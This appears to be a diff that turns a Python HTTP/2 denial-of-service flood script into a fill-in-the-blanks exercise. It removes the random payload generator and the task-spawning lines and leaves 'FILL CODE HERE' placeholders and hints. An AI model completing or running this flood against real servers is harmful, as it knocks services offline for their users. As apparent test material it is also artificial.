@@ -44,23 +44,13 @@ def generate_random_block_data():
     """
     Generates a random scrambled string and send it to the server.
     This ensures each request requires unique computational work on the server.
+    FILL CODE HERE: 
+    1. Generate a random string of length between 20-100 characters.
+    2. Use a mix of letters, numbers, and some special characters to mimic realistic blockchain data.
+    3. Occasionally add some realistic prefixes like 'block_', 'tx_', etc. to simulate blockchain-like data.
+    Return the generated string.
     """
-    # Generate random length between 20-100 characters
-    length = random.randint(20, 100)
-    
-    # Mix of letters, numbers, and some special characters
-    chars = string.ascii_letters + string.digits + '_-.'
-    
-    # Generate random string
-    random_data = ''.join(random.choice(chars) for _ in range(length))
-    
-    # Add some realistic blockchain-like prefixes occasionally
-    prefixes = ['block_', 'tx_', 'data_', 'hash_', 'chain_']
-    if random.random() < 0.3:  # 30% chance to add prefix
-        random_data = random.choice(prefixes) + random_data
-    
-    return random_data
-
+    pass  # FILL CODE HERE
 async def attack_worker(client, client_id, stream_id):
     """
     Individual HTTP/2 attack worker for a specific connection and stream.
@@ -70,7 +60,7 @@ async def attack_worker(client, client_id, stream_id):
     while running:
         try:
             # Generate random block data for this request
-            block_data = generate_random_block_data()
+            block_data = # FILL CODE HERE
             
             # Send GET request with block_data parameter to force server computation
             params = {'block_data': block_data}
@@ -119,7 +109,9 @@ async def http2_attack():
             
             # Create streams_per_connection workers for this client
             for stream_id in range(streams_per_connection):
-                task = asyncio.create_task(attack_worker(client, client_id, stream_id))
+                # Create and start an attack_worker task for this client and stream
+                # hint: use the asyncio.create_task function
+                task = # FILL CODE HERE
                 tasks.append(task)
         
         print(f"Started {len(tasks)} concurrent streams across {len(clients)} connections")
